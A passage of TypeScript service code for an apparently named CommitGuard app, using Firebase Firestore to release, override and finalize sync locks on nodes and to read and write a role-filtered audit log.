    await setDoc(doc(db, "commitguard_locks", newLock.id), newLock);
    await this.addAudit('LOCK', mainNode?.name || 'Unknown', subNode?.name || 'Unknown', user.name);
  }

  static async abortSync(subNodeId: string, user: User): Promise<void> {
    const locksCol = collection(db, "commitguard_locks");
    const q = query(locksCol, where("subNodeId", "==", subNodeId));
    const querySnapshot = await getDocs(q);
    if (querySnapshot.empty) return;

    const lockDoc = querySnapshot.docs[0];
    const lock = { ...lockDoc.data(), id: lockDoc.id } as CommitLock;
    
    if (lock.userId !== user.id && !isAdminRole(user.role)) {
      throw new Error("UNAUTHORIZED_OVERRIDE: Higher clearance required.");
    }
    
    const type = lock.userId === user.id ? 'UNLOCK' : 'OVERRIDE';
    const nodes = await this.getNodes();
    const mainNode = nodes.find(n => n.id === lock.nodeId);
    const subNode = mainNode?.subNodes.find(sn => sn.id === subNodeId);

    await deleteDoc(lockDoc.ref);
    await this.addAudit(type, mainNode?.name || 'Unknown', subNode?.name || 'Unknown', user.name);
  }

  static async finalizeSync(subNodeId: string, user: User): Promise<void> {
    const locksCol = collection(db, "commitguard_locks");
    const q = query(locksCol, where("subNodeId", "==", subNodeId));
    const querySnapshot = await getDocs(q);
    if (querySnapshot.empty) return;

    const lockDoc = querySnapshot.docs[0];
    const lock = { ...lockDoc.data(), id: lockDoc.id } as CommitLock;
    if (lock.userId !== user.id) return;
    
    const nodes = await this.getNodes();
    const mainNode = nodes.find(n => n.id === lock.nodeId);
    const subNode = mainNode?.subNodes.find(sn => sn.id === subNodeId);

    await deleteDoc(lockDoc.ref);
    await this.addAudit('SYNC_COMPLETE', mainNode?.name || 'Unknown', subNode?.name || 'Unknown', user.name);
  }

  static async getAuditArchive(): Promise<CommitAudit[]> {
    const currentUser = await AuthService.getCurrentUser();
    if (!currentUser) return [];

    const auditCol = collection(db, "commitguard_audit");
    const querySnapshot = await getDocs(auditCol);
    const allAudits: CommitAudit[] = querySnapshot.docs.map(doc => ({ ...doc.data(), id: doc.id } as CommitAudit));

    const isRootAdmin = currentUser.id === M_ID;
    const isLocalAdmin = isAdminRole(currentUser.role);

    if (isRootAdmin) return allAudits;

    if (isLocalAdmin) {
      // Local admins see all audits for better visibility
      return allAudits;
    }

    // Members see audits they performed OR audits on nodes they have access to
    const myNodes = await this.getNodes();
    const myNodeNames = myNodes.map(n => n.name);
    return allAudits.filter(a => a.userName === currentUser.name || myNodeNames.includes(a.nodeName));
  }

  private static async addAudit(type: CommitAudit['type'], nodeName: string, subNodeName: string, userName: string): Promise<void> {
    const newAudit: CommitAudit = {
      id: Math.random().toString(36).substr(2, 9),
      type,
      nodeName,
      subNodeName,
      userName,
      timestamp: new Date().toISOString()
    };
    await setDoc(doc(db, "commitguard_audit", newAudit.id), newAudit);
  }
}